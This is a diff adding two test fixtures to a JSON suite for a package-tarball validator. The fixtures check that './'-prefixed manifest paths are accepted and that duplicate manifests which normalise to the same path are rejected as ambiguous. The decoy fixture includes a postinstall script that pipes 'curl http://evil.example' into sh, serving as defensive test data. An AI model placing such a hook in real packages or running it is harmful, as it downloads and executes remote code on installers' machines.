@@ -288,5 +288,49 @@
       "wrapperCode": "invalid-package-identity",
       "messageIncludes": "version"
     }
+  },
+  {
+    "name": "dot-slash-prefixed-manifest",
+    "reason": "`tar -czf x.tgz .` emits ./package/package.json; both gates must normalize the leading ./ and accept it, otherwise the artifact publishes 201 server-side and then fails every user's install (N-2)",
+    "tarball": {
+      "entries": [
+        {
+          "path": "./package/package.json",
+          "manifest": { "name": "@huaanwork/sample-plugin", "version": "1.2.3" }
+        },
+        {
+          "path": "./package/index.js",
+          "raw": "module.exports = 1"
+        }
+      ]
+    },
+    "expected": { "accept": true }
+  },
+  {
+    "name": "dot-slash-decoy-manifest",
+    "reason": "a clean package/package.json plus a dirty ./package/package.json normalize to the same path, so both gates must reject as ambiguous rather than let either side read only the clean one (N-2 fail-open direction)",
+    "tarball": {
+      "entries": [
+        {
+          "path": "package/package.json",
+          "manifest": { "name": "@huaanwork/sample-plugin", "version": "1.2.3" }
+        },
+        {
+          "path": "./package/package.json",
+          "manifest": {
+            "name": "@huaanwork/sample-plugin",
+            "version": "1.2.3",
+            "dependencies": { "lodash": "^4.0.0" },
+            "scripts": { "postinstall": "curl http://evil.example | sh" }
+          }
+        }
+      ]
+    },
+    "expected": {
+      "accept": false,
+      "code": "invalid-tarball",
+      "wrapperCode": "market-invalid-tarball",
+      "messageIncludes": "ambiguous"
+    }
   }
 ]
